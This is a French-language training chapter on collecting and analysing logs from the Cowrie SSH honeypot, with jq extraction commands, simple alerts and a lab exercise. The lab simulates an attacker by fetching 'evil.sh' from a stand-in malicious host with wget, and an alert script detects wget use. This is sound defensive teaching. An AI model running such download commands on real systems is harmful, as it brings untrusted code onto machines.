# CHAPITRE 05 – Surveillance et collecte de données

---

## 1. Objectifs pédagogiques

À l’issue de ce chapitre, l’apprenant sera capable de :

* Identifier les types de données collectées par Cowrie
* Lire et interpréter les fichiers journaux produits
* Extraire les comportements suspects et les IOCs (indicateurs de compromission)
* Centraliser les logs pour une corrélation ou une visualisation (ex : ELK, Grafana)
* Créer des alertes simples pour une détection précoce d’attaques

---

## 2. Fichiers de log générés par Cowrie

Une fois Cowrie lancé, plusieurs fichiers sont automatiquement créés dans le dossier `log/`.

### 2.1. cowrie.log

* Format : texte brut
* Contient les messages de debug, connexions, erreurs d’exécution
* Lecture simple :

```bash
tail -f log/cowrie.log
```

### 2.2. cowrie.json

* Format : JSON (machine-readable, structuré)
* Utilisé pour les intégrations SIEM, alertes automatisées, outils de visualisation

Exemple :

```json
{
  "eventid": "cowrie.session.connect",
  "timestamp": "2025-07-04T10:30:55.520Z",
  "src_ip": "185.213.21.88",
  "session": "abc123456"
}
```

Lecture :

```bash
cat log/cowrie.json | jq .
```

---

### 2.3. ttylog/

* Enregistrements des sessions complètes (brutes) en format binaire
* Chaque fichier correspond à une session SSH ou Telnet
* Rejouer une session :

```bash
bin/playlog.py log/tty/ttylog.20250704-abc.log
```

---

### 2.4. dl/

* Répertoire des **fichiers uploadés par les attaquants** (via wget, curl, scp…)
* Exemples : scripts `.sh`, malware ELF, dropper Python
* Analyse possible : `file`, `strings`, `virustotal`, `yara`, `clamscan`

---

## 3. Événements typiques collectés (`eventid`)

Cowrie utilise des événements structurés. Voici quelques `eventid` utiles :

| Event ID                       | Description                    |
| ------------------------------ | ------------------------------ |
| `cowrie.session.connect`       | Connexion entrante             |
| `cowrie.login.success`         | Connexion réussie              |
| `cowrie.login.failed`          | Tentative échouée              |
| `cowrie.command.input`         | Commande tapée par l'attaquant |
| `cowrie.session.file_download` | Téléchargement via wget/curl   |
| `cowrie.session.file_upload`   | Téléversement via SCP/SFTP     |
| `cowrie.session.closed`        | Fin de session                 |

---

## 4. Extraction manuelle des données

### 4.1. Extraire toutes les adresses IP ayant tenté une connexion :

```bash
jq 'select(.eventid=="cowrie.session.connect") | .src_ip' log/cowrie.json | sort | uniq -c
```

### 4.2. Extraire les commandes tapées :

```bash
jq 'select(.eventid=="cowrie.command.input") | .input' log/cowrie.json
```

### 4.3. Voir les fichiers téléchargés :

```bash
jq 'select(.eventid=="cowrie.session.file_download") | {url: .url, dest: .outfile}' log/cowrie.json
```

---

## 5. Création d’alertes simples

### 5.1. Email automatique avec `mailx`

Déclencher une alerte si une commande `wget` est utilisée :

```bash
tail -f log/cowrie.json | jq -c 'select(.input=="wget")' | while read line; do
    echo "Alerte : wget détecté" | mailx -s "Alerte Cowrie" admin@example.com
done
```

### 5.2. Notification Telegram ou Discord

Utilisation d’un webhook (non couvert ici, voir Chapitre 06)

---

## 6. TP-05 : Visualisation et extraction manuelle

**Objectif** : Extraire, interpréter et rejouer les logs produits par Cowrie après une session simulée.

### Étapes :

1. Lancer Cowrie :

```bash
source cowrie-env/bin/activate
bin/cowrie start
```

2. Se connecter :

```bash
ssh admin@localhost -p 2222
mot de passe : admin123
```

3. Taper des commandes :

```bash
cd /tmp
wget http://malware.com/evil.sh
```

4. Observer les logs :

```bash
cat log/cowrie.log | tail -n 20
cat log/cowrie.json | jq '.'
```

5. Rejouer la session :

```bash
ls log/tty/
bin/playlog.py log/tty/ttylog.<timestamp>.log
```

6. Voir les fichiers téléchargés :

```bash
ls dl/
file dl/*
strings dl/*
```

---

## 7. Questions de révision

1. Quelle est la différence entre `cowrie.log` et `cowrie.json` ?
2. Où sont stockés les fichiers téléchargés par un attaquant ?
3. À quoi sert le fichier `ttylog/` ?
4. Que signifie l’eventid `cowrie.login.success` ?
5. Comment détecter automatiquement l’utilisation de `wget` ?

---

## 8. Ressources

* Analyse JSON : [https://stedolan.github.io/jq/](https://stedolan.github.io/jq/)
* Démo playlog : `bin/playlog.py log/tty/ttylog.2025...`
* Cowrie logging : [https://cowrie.readthedocs.io/en/latest/logging.html](https://cowrie.readthedocs.io/en/latest/logging.html)

